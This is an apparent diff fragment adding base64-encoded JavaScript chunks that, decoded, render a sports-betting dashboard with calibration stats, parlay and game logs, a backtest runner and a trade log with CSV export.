+`OjJweCI+JytpdGVtWzFdLncrJy0nK2l0ZW1bMV0ubCsnPC9kaXY+PC9kaXY+`,
+`Jzt9KTtodG1sKz0nPC9kaXY+PGRpdiBjbGFzcz0ibGJsIj5DYWxpYnJhdGlv`,
+`bjwvZGl2Pic7YnQuY2FsaWJyYXRpb24uZm9yRWFjaChmdW5jdGlvbihiKXtp`,
+`ZighYi5nYW1lcylyZXR1cm47dmFyIGFjdHVhbD1wYXJzZUZsb2F0KGIuYWN0`,
+`dWFsUGN0KSxtaWQ9KGIubG8rTWF0aC5taW4oYi5oaSwwLjc1KSkvMioxMDAs`,
+`ZGlmZj1hY3R1YWwtbWlkO3ZhciBjb2w9TWF0aC5hYnMoZGlmZik8NT8nIzVh`,
+`YmE4YSc6TWF0aC5hYnMoZGlmZik8MTA/JyM4YThhM2EnOicjYzA2MDYwJzto`,
+`dG1sKz0nPGRpdiBzdHlsZT0iZGlzcGxheTpmbGV4O2FsaWduLWl0ZW1zOmNl`,
+`bnRlcjtnYXA6OHB4O3BhZGRpbmc6NXB4IDhweDtiYWNrZ3JvdW5kOnJnYmEo`,
+`MjU1LDI1NSwyNTUsLjAyKTtib3JkZXItcmFkaXVzOjVweDtib3JkZXI6MXB4`,
+`IHNvbGlkICMyZTI0MTY7bWFyZ2luLWJvdHRvbTozcHgiPjxzcGFuIHN0eWxl`,
+`PSJmb250LXNpemU6MTBweDtjb2xvcjojNmE1YTNhO3dpZHRoOjU1cHg7Zmxl`,
+`eC1zaHJpbms6MCI+JytiLmxhYmVsKyc8L3NwYW4+PHNwYW4gc3R5bGU9ImZv`,
+`bnQtc2l6ZToxMHB4O2NvbG9yOiMyZTI0MTY7d2lkdGg6NDhweDtmbGV4LXNo`,
+`cmluazowIj4nK2IuZ2FtZXMrJyBnYW1lczwvc3Bhbj48ZGl2IHN0eWxlPSJm`,
+`bGV4OjE7aGVpZ2h0OjVweDtiYWNrZ3JvdW5kOiMyZTI0MTY7Ym9yZGVyLXJh`,
+`ZGl1czoycHg7b3ZlcmZsb3c6aGlkZGVuIj48ZGl2IHN0eWxlPSJoZWlnaHQ6`,
+`MTAwJTt3aWR0aDonKyhiLmFjdHVhbFBjdHx8MCkrJyU7YmFja2dyb3VuZDoj`,
+`NWE5YWMwO2JvcmRlci1yYWRpdXM6MnB4Ij48L2Rpdj48L2Rpdj48c3BhbiBz`,
+`dHlsZT0iZm9udC1zaXplOjExcHg7Zm9udC1mYW1pbHk6bW9ub3NwYWNlO2Nv`,
+`bG9yOiM1YTlhYzA7d2lkdGg6MzhweDt0ZXh0LWFsaWduOnJpZ2h0O2ZsZXgt`,
+`c2hyaW5rOjAiPicrYi5hY3R1YWxQY3QrJyU8L3NwYW4+PHNwYW4gc3R5bGU9`,
+`ImZvbnQtc2l6ZToxMHB4O2ZvbnQtZmFtaWx5Om1vbm9zcGFjZTtjb2xvcjon`,
+`K2NvbCsnO3dpZHRoOjQwcHg7dGV4dC1hbGlnbjpyaWdodDtmbGV4LXNocmlu`,
+`azowIj4nKyhkaWZmPjA/JysnOicnKStkaWZmLnRvRml4ZWQoMSkrJzwvc3Bh`,
+`bj48L2Rpdj4nO30pO2h0bWwrPSc8L2Rpdj48ZGl2IHN0eWxlPSJkaXNwbGF5`,
+`OmdyaWQ7Z3JpZC10ZW1wbGF0ZS1jb2x1bW5zOjFmciAxZnIgMWZyO2dhcDo4`,
+`cHg7bWFyZ2luLWJvdHRvbToxMnB4Ij4nO1tbJ1NpbmdsZScsYnQucDFSZWNv`,
+`cmQsJyNjODkyMmEnLGJ0LnAxUm9pXSxbJzItTGVnJyxidC5wMlJlY29yZCwn`,
+`IzVhOWFjMCcsYnQucDJSb2ldLFsnMy1MZWcnLGJ0LnAzUmVjb3JkLCcjOWE1`,
+`YWMwJyxidC5wM1JvaV1dLmZvckVhY2goZnVuY3Rpb24oaXRlbSl7aHRtbCs9`,
+`JzxkaXYgc3R5bGU9ImJhY2tncm91bmQ6cmdiYSgyNTUsMjU1LDI1NSwuMDIp`,
+`O2JvcmRlcjoxcHggc29saWQgJytpdGVtWzJdKyc0NDtib3JkZXItcmFkaXVz`,
+`OjhweDtwYWRkaW5nOjEwcHggOHB4O3RleHQtYWxpZ246Y2VudGVyIj48ZGl2`,
+`IHN0eWxlPSJmb250LXNpemU6OXB4O2NvbG9yOicraXRlbVsyXSsnO2xldHRl`,
+`ci1zcGFjaW5nOjJweDt0ZXh0LXRyYW5zZm9ybTp1cHBlcmNhc2U7bWFyZ2lu`,
+`LWJvdHRvbTo0cHgiPicraXRlbVswXSsnPC9kaXY+PGRpdiBzdHlsZT0iZm9u`,
+`dC1zaXplOjE4cHg7Zm9udC13ZWlnaHQ6OTAwO2ZvbnQtZmFtaWx5Om1vbm9z`,
+`cGFjZTtjb2xvcjonKyhpdGVtWzFdLnBjdCE9PW51bGwmJnBhcnNlRmxvYXQo`,
+`aXRlbVsxXS5wY3QpPjUwPycjNWFiYThhJzonI2MwNjA2MCcpKyciPicrKGl0`,
+`ZW1bMV0ucGN0IT09bnVsbD9pdGVtWzFdLnBjdCsnJSc6Jy0tJykrJzwvZGl2`,
+`PjxkaXYgc3R5bGU9ImZvbnQtc2l6ZToxMHB4O2NvbG9yOiM2YTVhM2E7bWFy`,
+`Z2luLXRvcDoycHgiPicraXRlbVsxXS53KyctJytpdGVtWzFdLmwrJzwvZGl2`,
+`PjxkaXYgc3R5bGU9ImZvbnQtc2l6ZToxMHB4O2ZvbnQtZmFtaWx5Om1vbm9z`,
+`cGFjZTtjb2xvcjonKyhwYXJzZUZsb2F0KGl0ZW1bM10pPj0wPycjNWFiYThh`,
+`JzonI2MwNjA2MCcpKyc7bWFyZ2luLXRvcDo0cHgiPlJPSSAnK2l0ZW1bM10r`,
+`JyU8L2Rpdj48L2Rpdj4nO30pO2h0bWwrPSc8L2Rpdj48ZGl2IGNsYXNzPSJj`,
+`YXJkIj48ZGl2IGNsYXNzPSJsYmwiPlBhcmxheSBMb2c8L2Rpdj48ZGl2IHN0`,
+`eWxlPSJtYXgtaGVpZ2h0OjM2MHB4O292ZXJmbG93LXk6YXV0byI+JztidC5w`,
+`YXJsYXlEYXlzLnNsaWNlKCkucmV2ZXJzZSgpLmZvckVhY2goZnVuY3Rpb24o`,
+`ZGF5KXtpZighZGF5LnNpbmdsZSYmIWRheS5wYXJsYXkyJiYhZGF5LnBhcmxh`,
+`eTMpcmV0dXJuO2h0bWwrPSc8ZGl2IHN0eWxlPSJiYWNrZ3JvdW5kOnJnYmEo`,
+`MjU1LDI1NSwyNTUsLjAyKTtib3JkZXI6MXB4IHNvbGlkICMyZTI0MTY7Ym9y`,
+`ZGVyLXJhZGl1czo3cHg7cGFkZGluZzo4cHggMTBweDttYXJnaW4tYm90dG9t`,
+`OjVweCI+PGRpdiBzdHlsZT0iZm9udC1zaXplOjEwcHg7Y29sb3I6IzZhNWEz`,
+`YTtmb250LWZhbWlseTptb25vc3BhY2U7bWFyZ2luLWJvdHRvbTo2cHg7Zm9u`,
+`dC13ZWlnaHQ6NzAwIj4nK2RheS5kYXRlKyc8L2Rpdj4nO1tbJ3NpbmdsZScs`,
+`JzEtTGVnJywnI2M4OTIyYSddLFsncGFybGF5MicsJzItTGVnJywnIzVhOWFj`,
+`MCddLFsncGFybGF5MycsJzMtTGVnJywnIzlhNWFjMCddXS5mb3JFYWNoKGZ1`,
+`bmN0aW9uKGl0ZW0pe3ZhciBwPWRheVtpdGVtWzBdXTtpZighcClyZXR1cm47`,
+`aHRtbCs9JzxkaXYgc3R5bGU9ImRpc3BsYXk6ZmxleDthbGlnbi1pdGVtczpj`,
+`ZW50ZXI7Z2FwOjhweDtwYWRkaW5nOjRweCA4cHg7YmFja2dyb3VuZDonKyhw`,
+`LmhpdD8ncmdiYSg1OCwxMzgsOTAsLjA3KSc6J3JnYmEoMTM4LDU4LDU4LC4w`,
+`NyknKSsnO2JvcmRlci1yYWRpdXM6NHB4O2JvcmRlcjoxcHggc29saWQgJyso`,
+`cC5oaXQ/JyMxYTNhMmEnOicjM2ExYTFhJykrJzttYXJnaW4tYm90dG9tOjNw`,
+`eCI+PHNwYW4gc3R5bGU9ImZvbnQtc2l6ZTo5cHg7Zm9udC13ZWlnaHQ6NzAw`,
+`O2NvbG9yOicraXRlbVsyXSsnO3dpZHRoOjMycHg7ZmxleC1zaHJpbms6MCI+`,
+`JytpdGVtWzFdKyc8L3NwYW4+PHNwYW4gc3R5bGU9ImZvbnQtc2l6ZToxMHB4`,
+`O2NvbG9yOicrKHAuaGl0PycjZTBiMDQwJzonIzc3NycpKyc7ZmxleDoxO292`,
+`ZXJmbG93OmhpZGRlbjt0ZXh0LW92ZXJmbG93OmVsbGlwc2lzO3doaXRlLXNw`,
+`YWNlOm5vd3JhcCI+JytwLmxhYmVsKyc8L3NwYW4+PHNwYW4gc3R5bGU9ImZv`,
+`bnQtc2l6ZToxMHB4O2NvbG9yOicrKHAuaGl0PycjNWFiYThhJzonI2MwNjA2`,
+`MCcpKyc7ZmxleC1zaHJpbms6MCI+JysocC5oaXQ/J0hJVCc6J01JU1MnKSsn`,
+`PC9zcGFuPjwvZGl2Pic7fSk7aHRtbCs9JzwvZGl2Pic7fSk7aHRtbCs9Jzwv`,
+`ZGl2PjwvZGl2PjxkaXYgY2xhc3M9ImNhcmQiPjxkaXYgY2xhc3M9ImxibCI+`,
+`R2FtZSBMb2cgKCcrYnQuYmV0cy5sZW5ndGgrJyBnYW1lcyk8L2Rpdj48ZGl2`,
+`IHN0eWxlPSJtYXgtaGVpZ2h0OjMwMHB4O292ZXJmbG93LXk6YXV0byI+Jzti`,
+`dC5iZXRzLnNsaWNlKCkucmV2ZXJzZSgpLmZvckVhY2goZnVuY3Rpb24ocil7`,
+`aHRtbCs9JzxkaXYgc3R5bGU9ImRpc3BsYXk6ZmxleDthbGlnbi1pdGVtczpj`,
+`ZW50ZXI7Z2FwOjdweDtwYWRkaW5nOjVweCA5cHg7Ym9yZGVyLXJhZGl1czo1`,
+`cHg7ZmxleC13cmFwOndyYXA7bWFyZ2luLWJvdHRvbTozcHg7YmFja2dyb3Vu`,
+`ZDonKyhyLmNvcnJlY3Q/J3JnYmEoNTgsMTM4LDkwLC4wNiknOidyZ2JhKDEz`,
+`OCw1OCw1OCwuMDYpJykrJztib3JkZXI6MXB4IHNvbGlkICcrKHIuY29ycmVj`,
+`dD8nIzFhM2EyYSc6JyMzYTFhMWEnKSsnIj48c3BhbiBzdHlsZT0iZm9udC1z`,
+`aXplOjlweDtjb2xvcjojMmUyNDE2O3dpZHRoOjcwcHg7ZmxleC1zaHJpbms6`,
+`MDtmb250LWZhbWlseTptb25vc3BhY2UiPicrci5kYXRlKyc8L3NwYW4+PHNw`,
+`YW4gc3R5bGU9ImZvbnQtc2l6ZToxMHB4O2NvbG9yOicrKHIuY29ycmVjdD8n`,
+`I2UwYjA0MCc6JyM4ODgnKSsnO2ZsZXg6MTtmb250LXdlaWdodDonKyhyLmNv`,
+`cnJlY3Q/NzAwOjQwMCkrJyI+JytyLndpbm5lcisnPC9zcGFuPjxzcGFuIHN0`,
+`eWxlPSJmb250LXNpemU6OXB4O2NvbG9yOicrKHIuY29ycmVjdD8nIzNhNmEz`,
+`YSc6JyM2YTNhM2EnKSsnO2ZsZXgtc2hyaW5rOjAiPicrKHIuY29ycmVjdD8n`,
+`dic6J3gnKSsnICcrKHIuYWN0dWFsV2lubmVyP3IuYWN0dWFsV2lubmVyLnNw`,
+`bGl0KCcgJykucG9wKCk6JycpKyc8L3NwYW4+PHNwYW4gc3R5bGU9ImZvbnQt`,
+`c2l6ZToxMHB4O2ZvbnQtZmFtaWx5Om1vbm9zcGFjZTtjb2xvcjonKyhyLndp`,
+`bm5lck1MJiZyLndpbm5lck1MWzBdPT09JysnPycjNWFiYThhJzonI2M4Yjg5`,
+`MCcpKyc7d2lkdGg6NDBweDt0ZXh0LWFsaWduOnJpZ2h0O2ZsZXgtc2hyaW5r`,
+`OjAiPicrci53aW5uZXJNTCsnPC9zcGFuPjxzcGFuIHN0eWxlPSJmb250LXNp`,
+`emU6OXB4O2NvbG9yOicrY29uZkNvbChyLmNvbmZpZGVuY2UpKyc7d2lkdGg6`,
+`MzRweDt0ZXh0LWFsaWduOnJpZ2h0O2ZsZXgtc2hyaW5rOjAiPicrci5jb25m`,
+`aWRlbmNlKyc8L3NwYW4+PC9kaXY+Jzt9KTtodG1sKz0nPC9kaXY+PC9kaXY+`,
+`Jzt9ZWwuaW5uZXJIVE1MPWh0bWw7dmFyIGJzPWRvY3VtZW50LmdldEVsZW1l`,
+`bnRCeUlkKCdidC1zdGFydCcpO2lmKGJzKWJzLm9uY2hhbmdlPWZ1bmN0aW9u`,
+`KCl7c1NldCgnYnRTdGFydCcsdGhpcy52YWx1ZSk7fTt2YXIgYmU9ZG9jdW1l`,
+`bnQuZ2V0RWxlbWVudEJ5SWQoJ2J0LWVuZCcpO2lmKGJlKWJlLm9uY2hhbmdl`,
+`PWZ1bmN0aW9uKCl7c1NldCgnYnRFbmQnLHRoaXMudmFsdWUpO307fQpmdW5j`,
+`dGlvbiBkb0JhY2t0ZXN0KCl7Uy5idExvYWRpbmc9dHJ1ZTtTLmJ0RXJyb3I9`,
+`Jyc7Uy5idFJlc3VsdHM9bnVsbDtTLmJ0UHJvZ3Jlc3M9J0ZldGNoaW5nIGNv`,
+`bXBsZXRlZCBnYW1lcy4uLic7cmVuZGVyQmFja3Rlc3QoKTt2YXIgeXI9Uy5i`,
+`dEVuZC5zbGljZSgwLDQpO2ZldGNoQ29tcGxldGVkKFMuYnRTdGFydCxTLmJ0`,
+`RW5kKS50aGVuKGZ1bmN0aW9uKGdhbWVzKXtpZighZ2FtZXMubGVuZ3RoKXtT`,
+`LmJ0RXJyb3I9J05vIGdhbWVzIGZvdW5kLiBUcnkgYSByYW5nZSB3aXRoaW4g`,
+`QXByaWwtT2N0b2Jlci4nO1MuYnRMb2FkaW5nPWZhbHNlO3JlbmRlckJhY2t0`,
+`ZXN0KCk7cmV0dXJuO312YXIgYW5hbHl6ZWQ9W10sZXJyb3JzPTAsaT0wO1Mu`,
+`YnRQcm9ncmVzcz0nRm91bmQgJytnYW1lcy5sZW5ndGgrJyBnYW1lcy4gQW5h`,
+`bHl6aW5nLi4uJztyZW5kZXJCYWNrdGVzdCgpO2Z1bmN0aW9uIG5leHQoKXtp`,
+`ZihpPj1nYW1lcy5sZW5ndGgpe1MuYnRMb2FkaW5nPWZhbHNlO1MuYnRQcm9n`,
+`cmVzcz0nJztpZighYW5hbHl6ZWQubGVuZ3RoKXtTLmJ0RXJyb3I9JzAvJytn`,
+`YW1lcy5sZW5ndGgrJyBhbmFseXplZC4gVHJ5IGEgc2hvcnRlciByYW5nZS4n`,
+`O3JlbmRlckJhY2t0ZXN0KCk7cmV0dXJuO310cnl7Uy5idFJlc3VsdHM9Y29t`,
+`cHV0ZUJhY2t0ZXN0KGFuYWx5emVkLFMuYmFua3JvbGwpO31jYXRjaChlKXtT`,
+`LmJ0RXJyb3I9J0Vycm9yOiAnK2UubWVzc2FnZTtyZW5kZXJCYWNrdGVzdCgp`,
+`O3JldHVybjt9c2V0VGltZW91dChmdW5jdGlvbigpe3JlbmRlckJhY2t0ZXN0`,
+`KCk7fSwxMDApO3JldHVybjt9dmFyIGJhdGNoPWdhbWVzLnNsaWNlKGksaSsy`,
+`KTtpKz0yO1MuYnRQcm9ncmVzcz0nQW5hbHl6aW5nICcrTWF0aC5taW4oaSxn`,
+`YW1lcy5sZW5ndGgpKycvJytnYW1lcy5sZW5ndGgrJyAtICcrYW5hbHl6ZWQu`,
+`bGVuZ3RoKycgb2ssICcrZXJyb3JzKycgZmFpbGVkJztyZW5kZXJCYWNrdGVz`,
+`dCgpO1Byb21pc2UuYWxsU2V0dGxlZChiYXRjaC5tYXAoZnVuY3Rpb24oZyl7`,
+`cmV0dXJuIGFuYWx5emVHYW1lQ2FjaGVkKGcseXIpO30pKS50aGVuKGZ1bmN0`,
+`aW9uKHJlcyl7cmVzLmZvckVhY2goZnVuY3Rpb24ocil7aWYoci5zdGF0dXM9`,
+`PT0nZnVsZmlsbGVkJylhbmFseXplZC5wdXNoKHIudmFsdWUpO2Vsc2UgZXJy`,
+`b3JzKys7fSk7c2V0VGltZW91dChuZXh0LDEwMCk7fSkuY2F0Y2goZnVuY3Rp`,
+`b24oKXtlcnJvcnMrPWJhdGNoLmxlbmd0aDtzZXRUaW1lb3V0KG5leHQsMTAw`,
+`KTt9KTt9c2V0VGltZW91dChuZXh0LDIwMCk7fSkuY2F0Y2goZnVuY3Rpb24o`,
+`ZSl7Uy5idEVycm9yPSdGZXRjaCBmYWlsZWQ6ICcrZS5tZXNzYWdlO1MuYnRM`,
+`b2FkaW5nPWZhbHNlO3JlbmRlckJhY2t0ZXN0KCk7fSk7fQpmdW5jdGlvbiBy`,
+`ZW5kZXJUcmFkZUxvZygpe3ZhciBlbD1kb2N1bWVudC5nZXRFbGVtZW50QnlJ`,
+`ZCgndGFiNCcpO2lmKCFlbClyZXR1cm47dmFyIHRyYWRlcz1sb2FkVHJhZGVz`,
+`KCk7dmFyIHNldHRsZWQ9dHJhZGVzLmZpbHRlcihmdW5jdGlvbih0KXtyZXR1`,
+`cm4gdC5yZXN1bHQ9PT0nd2luJ3x8dC5yZXN1bHQ9PT0nbG9zcyc7fSk7dmFy`,
+`IHdpbnM9c2V0dGxlZC5maWx0ZXIoZnVuY3Rpb24odCl7cmV0dXJuIHQucmVz`,
+`dWx0PT09J3dpbic7fSk7dmFyIHRvdGFsUG5sPXNldHRsZWQucmVkdWNlKGZ1`,
+`bmN0aW9uKHMsdCl7cmV0dXJuIHMrKHBhcnNlRmxvYXQodC5wbmwpfHwwKTt9`,
+`LDApO3ZhciB0b3RhbFN0YWtlPXNldHRsZWQucmVkdWNlKGZ1bmN0aW9uKHMs`,
+`dCl7cmV0dXJuIHMrKHBhcnNlRmxvYXQodC5zdGFrZSl8fDApO30sMCk7dmFy`,
+`IHBlbmRpbmc9dHJhZGVzLmZpbHRlcihmdW5jdGlvbih0KXtyZXR1cm4gdC5y`,
+`ZXN1bHQ9PT0ncGVuZGluZyc7fSkubGVuZ3RoO3ZhciBwY3Q9c2V0dGxlZC5s`,
+`ZW5ndGg/KHdpbnMubGVuZ3RoL3NldHRsZWQubGVuZ3RoKjEwMCkudG9GaXhl`,
+`ZCgxKTpudWxsO3ZhciByb2k9dG90YWxTdGFrZT8odG90YWxQbmwvdG90YWxT`,
+`dGFrZSoxMDApLnRvRml4ZWQoMSk6bnVsbDt2YXIgaHRtbD0nPGRpdiBjbGFz`,
+`cz0iY2FyZCIgc3R5bGU9Im1hcmdpbi1ib3R0b206MTJweCI+PGRpdiBzdHls`,
+`ZT0iZGlzcGxheTpmbGV4O2p1c3RpZnktY29udGVudDpzcGFjZS1iZXR3ZWVu`,
+`O2FsaWduLWl0ZW1zOmNlbnRlcjttYXJnaW4tYm90dG9tOjEycHg7ZmxleC13`,
+`cmFwOndyYXA7Z2FwOjhweCI+PGRpdiBjbGFzcz0ibGJsIiBzdHlsZT0ibWFy`,
+`Z2luLWJvdHRvbTowIj5UcmFkZSBMb2c8L2Rpdj48ZGl2IHN0eWxlPSJkaXNw`,
+`bGF5OmZsZXg7Z2FwOjhweCI+PGJ1dHRvbiBvbmNsaWNrPSJleHBvcnRDU1Yo`,
+`KSIgc3R5bGU9InBhZGRpbmc6NXB4IDEycHg7Ym9yZGVyLXJhZGl1czo1cHg7`,
+`Ym9yZGVyOjFweCBzb2xpZCAjMjUyMDE1O2JhY2tncm91bmQ6dHJhbnNwYXJl`,
+`bnQ7Y29sb3I6IzZhNWEzYTtmb250LXNpemU6MTFweDtjdXJzb3I6cG9pbnRl`,
+`ciI+RXhwb3J0IENTVjwvYnV0dG9uPjxidXR0b24gb25jbGljaz0ic2hvd0xv`,
+`Z0Zvcm0oKSIgc3R5bGU9InBhZGRpbmc6NXB4IDEycHg7Ym9yZGVyLXJhZGl1`,
+`czo1cHg7Ym9yZGVyOm5vbmU7YmFja2dyb3VuZDpsaW5lYXItZ3JhZGllbnQo`,
+`MTM1ZGVnLCNjODkyMmEsIzlhNmUxOCk7Y29sb3I6IzA4MDYwMDtmb250LXNp`,
+`emU6MTFweDtmb250LXdlaWdodDo3MDA7Y3Vyc29yOnBvaW50ZXIiPisgTG9n`,
+`IFRyYWRlPC9idXR0b24+PC9kaXY+PC9kaXY+PGRpdiBzdHlsZT0iZGlzcGxh`,
+`eTpncmlkO2dyaWQtdGVtcGxhdGUtY29sdW1uczpyZXBlYXQoNCwxZnIpO2dh`,
+`cDo4cHgiPic7W1snUmVjb3JkJyxzZXR0bGVkLmxlbmd0aD93aW5zLmxlbmd0`,
+`aCsnLScrKHNldHRsZWQubGVuZ3RoLXdpbnMubGVuZ3RoKTonLS0nLG51bGxd`,
+`LFsnV2luICUnLHBjdD9wY3QrJyUnOictLScscGN0JiZwYXJzZUZsb2F0KHBj`,
+`dCk+NTVdLFsnUCZMJyxzZXR0bGVkLmxlbmd0aD8odG90YWxQbmw+PTA/Jysn`,
+`OicnKSt0b3RhbFBubC50b0ZpeGVkKDIpOictLScsdG90YWxQbmw+PTBdLFsn`,
+`Uk9JJyxyb2k/cm9pKyclJzonLS0nLHJvaSYmcGFyc2VGbG9hdChyb2kpPj0w`,
+`XV0uZm9yRWFjaChmdW5jdGlvbihpdGVtKXt2YXIgY29sPWl0ZW1bMl09PT10`,
+`cnVlPycjNWFiYThhJzppdGVtWzJdPT09ZmFsc2UmJml0ZW1bMV0hPT0nLS0n`,
+`PycjYzA2MDYwJzonIzZhNWEzYSc7aHRtbCs9JzxkaXYgc3R5bGU9ImJhY2tn`,
+`cm91bmQ6cmdiYSgyNTUsMjU1LDI1NSwuMDIpO2JvcmRlcjoxcHggc29saWQg`,
+`IzJlMjQxNjtib3JkZXItcmFkaXVzOjdweDtwYWRkaW5nOjhweCA2cHg7dGV4`,
+`dC1hbGlnbjpjZW50ZXIiPjxkaXYgc3R5bGU9ImZvbnQtc2l6ZTo5cHg7Y29s`,
+`b3I6IzZhNWEzYTtsZXR0ZXItc3BhY2luZzoycHg7dGV4dC10cmFuc2Zvcm06`,
+`dXBwZXJjYXNlO21hcmdpbi1ib3R0b206M3B4Ij4nK2l0ZW1bMF0rJzwvZGl2`,
+`PjxkaXYgc3R5bGU9ImZvbnQtc2l6ZToxNXB4O2ZvbnQtd2VpZ2h0OjkwMDtm`,
+`b250LWZhbWlseTptb25vc3BhY2U7Y29sb3I6Jytjb2wrJyI+JytpdGVtWzFd`,
+`Kyc8L2Rpdj48L2Rpdj4nO30pO2h0bWwrPSc8L2Rpdj4nO2lmKHBlbmRpbmc+`,
+`MClodG1sKz0nPGRpdiBzdHlsZT0ibWFyZ2luLXRvcDo4cHg7Zm9udC1zaXpl`,
+`OjEwcHg7Y29sb3I6IzZhNWEzYSI+JytwZW5kaW5nKycgcGVuZGluZyAtIHRh`,
+`cCBXSU4vTE9TUyB0byBtYXJrIHJlc3VsdDwvZGl2Pic7aHRtbCs9JzwvZGl2`,
+`PjxkaXYgaWQ9ImxvZy1mb3JtIiBzdHlsZT0iZGlzcGxheTpub25lIiBjbGFz`,
+`cz0iY2FyZCI+PGRpdiBjbGFzcz0ibGJsIj5Mb2cgTmV3IFRyYWRlPC9kaXY+`,
+`PGRpdiBzdHlsZT0iZGlzcGxheTpmbGV4O2ZsZXgtZGlyZWN0aW9uOmNvbHVt`,
+`bjtnYXA6OHB4Ij4nO2lmKFMucmVzdWx0cy5sZW5ndGgpe2h0bWwrPSc8ZGl2`,
+`PjxkaXYgc3R5bGU9ImZvbnQtc2l6ZTo5cHg7Y29sb3I6IzJlMjQxNjtsZXR0`,
+`ZXItc3BhY2luZzoycHg7bWFyZ2luLWJvdHRvbTo0cHgiPlBJQ0sgRlJPTSBU`,
+`T0RBWTwvZGl2PjxzZWxlY3QgaWQ9Imx0LWdhbWUiIHN0eWxlPSJ3aWR0aDox`,
+`MDAlO2ZvbnQtc2l6ZToxM3B4O3BhZGRpbmc6OXB4IDEwcHg7YmFja2dyb3Vu`,
+`ZDojMGEwOTA3O2JvcmRlcjoxcHggc29saWQgIzI1MjAxNTtib3JkZXItcmFk`,
+`aXVzOjZweDtjb2xvcjojYzhiODkwO291dGxpbmU6bm9uZSI+PG9wdGlvbiB2`,
+`YWx1ZT0iIj5TZWxlY3QgZ2FtZS4uLjwvb3B0aW9uPic7Uy5yZXN1bHRzLmZv`,
+`ckVhY2goZnVuY3Rpb24ocixpKXtodG1sKz0nPG9wdGlvbiB2YWx1ZT0iJytp`,
+`KyciPicrci53aW5uZXIrJyB2cyAnKyhyLndpbm5lcj09PXIuYU5hbWU/ci5i`,
+`TmFtZTpyLmFOYW1lKSsnICgnK3IuY29uZmlkZW5jZSsnICcrKHIud2lubmVy`,
+`UCoxMDApLnRvRml4ZWQoMCkrJyUpPC9vcHRpb24+Jzt9KTtodG1sKz0nPC9z`,
+`ZWxlY3Q+PC9kaXY+Jzt9aHRtbCs9JzxkaXYgc3R5bGU9ImRpc3BsYXk6Z3Jp`,
+`ZDtncmlkLXRlbXBsYXRlLWNvbHVtbnM6MWZyIDFmciAxZnI7Z2FwOjhweCI+`,
+`PGRpdj48ZGl2IHN0eWxlPSJmb250LXNpemU6OXB4O2NvbG9yOiMyZTI0MTY7`,
+`bGV0dGVyLXNwYWNpbmc6MnB4O21hcmdpbi1ib3R0b206M3B4Ij5CT09LIE1M`,
+`PC9kaXY+PGlucHV0IGlkPSJsdC1tbCIgdHlwZT0idGV4dCIgcGxhY2Vob2xk`,
+`ZXI9Ii0xNTAiIHN0eWxlPSJ3aWR0aDoxMDAlO2ZvbnQtc2l6ZToxMnB4O3Bh`,
+`ZGRpbmc6OHB4IDEwcHg7YmFja2dyb3VuZDojMGEwOTA3O2JvcmRlcjoxcHgg`,
+`c29saWQgIzI1MjAxNTtib3JkZXItcmFkaXVzOjZweDtjb2xvcjojYzhiODkw`,
+`O291dGxpbmU6bm9uZTtmb250LWZhbWlseTptb25vc3BhY2UiPjwvZGl2Pjxk`,
+`aXY+PGRpdiBzdHlsZT0iZm9udC1zaXplOjlweDtjb2xvcjojMmUyNDE2O2xl`,
+`dHRlci1zcGFjaW5nOjJweDttYXJnaW4tYm90dG9tOjNweCI+U1RBS0UgJDwv`,
+`ZGl2PjxpbnB1dCBpZD0ibHQtc3Rha2UiIHR5cGU9Im51bWJlciIgcGxhY2Vo`,
+`b2xkZXI9IjI1IiBzdHlsZT0id2lkdGg6MTAwJTtmb250LXNpemU6MTJweDtw`,
+`YWRkaW5nOjhweCAxMHB4O2JhY2tncm91bmQ6IzBhMDkwNztib3JkZXI6MXB4`,
+`IHNvbGlkICMyNTIwMTU7Ym9yZGVyLXJhZGl1czo2cHg7Y29sb3I6I2M4Yjg5`,
+`MDtvdXRsaW5lOm5vbmUiPjwvZGl2PjxkaXY+PGRpdiBzdHlsZT0iZm9udC1z`,
+`aXplOjlweDtjb2xvcjojMmUyNDE2O2xldHRlci1zcGFjaW5nOjJweDttYXJn`,
+`aW4tYm90dG9tOjNweCI+REFURTwvZGl2PjxpbnB1dCBpZD0ibHQtZGF0ZSIg`,
+`dHlwZT0iZGF0ZSIgdmFsdWU9IicrUy5kYXRlKyciIHN0eWxlPSJ3aWR0aDox`,
+`MDAlO2ZvbnQtc2l6ZToxMnB4O3BhZGRpbmc6OHB4IDEwcHg7YmFja2dyb3Vu`,
+`ZDojMGEwOTA3O2JvcmRlcjoxcHggc29saWQgIzI1MjAxNTtib3JkZXItcmFk`,
+`aXVzOjZweDtjb2xvcjojYzhiODkwO291dGxpbmU6bm9uZSI+PC9kaXY+PC9k`,
+`aXY+PGRpdiBzdHlsZT0iZGlzcGxheTpmbGV4O2dhcDo4cHg7bWFyZ2luLXRv`,
+`cDo0cHgiPjxidXR0b24gb25jbGljaz0ic3VibWl0TG9nKCkiIHN0eWxlPSJm`,
+`bGV4OjE7cGFkZGluZzoxMHB4O2JvcmRlci1yYWRpdXM6NnB4O2JvcmRlcjpu`,
+`b25lO2JhY2tncm91bmQ6bGluZWFyLWdyYWRpZW50KDEzNWRlZywjYzg5MjJh`,
+`LCM5YTZlMTgpO2NvbG9yOiMwODA2MDA7Zm9udC13ZWlnaHQ6OTAwO2ZvbnQt`,
+`c2l6ZToxM3B4O2N1cnNvcjpwb2ludGVyIj5TYXZlIFRyYWRlPC9idXR0b24+`,
+`PGJ1dHRvbiBvbmNsaWNrPSJoaWRlTG9nRm9ybSgpIiBzdHlsZT0icGFkZGlu`,
+`ZzoxMHB4IDE2cHg7Ym9yZGVyLXJhZGl1czo2cHg7Ym9yZGVyOjFweCBzb2xp`,
+`ZCAjMjUyMDE1O2JhY2tncm91bmQ6dHJhbnNwYXJlbnQ7Y29sb3I6IzZhNWEz`,
+`YTtmb250LXNpemU6MTJweDtjdXJzb3I6cG9pbnRlciI+Q2FuY2VsPC9idXR0`,
+`b24+PC9kaXY+PC9kaXY+PC9kaXY+JztpZighdHJhZGVzLmxlbmd0aCl7aHRt`,
+`bCs9JzxkaXYgY2xhc3M9ImNhcmQiIHN0eWxlPSJ0ZXh0LWFsaWduOmNlbnRl`,
+`cjtwYWRkaW5nOjI4cHgiPjxkaXYgc3R5bGU9ImZvbnQtc2l6ZToyOHB4O21h`,
+`cmdpbi1ib3R0b206MTBweCI+JiMxMjgyMDM7PC9kaXY+PGRpdiBzdHlsZT0i`,
+`Y29sb3I6IzZhNWEzYSI+Tm8gdHJhZGVzIGxvZ2dlZCB5ZXQuPC9kaXY+PC9k`,
